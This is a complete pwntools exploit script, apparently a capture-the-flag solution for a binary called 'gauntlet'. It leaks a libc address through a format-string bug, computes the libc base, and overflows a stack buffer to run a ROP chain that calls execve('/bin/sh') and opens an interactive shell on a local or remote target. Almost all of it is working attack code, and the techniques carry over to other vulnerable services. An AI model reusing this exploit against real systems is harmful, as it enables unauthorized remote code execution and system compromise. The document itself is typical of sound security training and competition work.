# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template gauntlet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'gauntlet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local execve version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
libc = ELF('libc-2.27.so')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

LIBC_START_MAIN_INDEX = 23
LIBC_START_MAIN_LEAK_OFFSET =  231


io = start()

log.info("leaking __libc_start_main+231...")
io.sendline(f"%{LIBC_START_MAIN_INDEX}$p")
libc_start_main = int(io.readline().strip().decode('latin1'), 16) - LIBC_START_MAIN_LEAK_OFFSET

log.info(f"__libc_start_main = {hex(libc_start_main)}")
libc_base = libc_start_main - libc.symbols['__libc_start_main']
log.info(f"libc_base = {hex(libc_base)}")
gets = libc_base + libc.symbols['gets']
log.info(f"gets = {hex(gets)}")
execve = libc_base + libc.symbols['execve']
log.info(f"execve = {hex(execve)}")
bin_sh_string = libc_base + next(libc.search(b'/bin/sh'))
log.info('calculating gadgets now...')
# idk man find_gadget was all funky ill just use ropper output
pop_rdi = libc_base + 0x000000000002164f
log.info(f"pop_rdi = {hex(pop_rdi)}")

pop_rdx_rsi = libc_base + 0x0000000000130539
log.info(f"pop_rdx_rsi = {hex(pop_rdx_rsi)}")

log.info("triggering payload 1- using gets to get an uncontrolled read. this is better than the first fgets because strcpy won't read \0")
io.sendline(b'C' * 120 + p64(gets))
#pause()
log.info("triggering stage 2 - uncontrolled rop chain")
io.sendline(b'A' * 16 + p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(pop_rdi) + p64(bin_sh_string) +  p64(execve) + cyclic(400))
io.interactive()
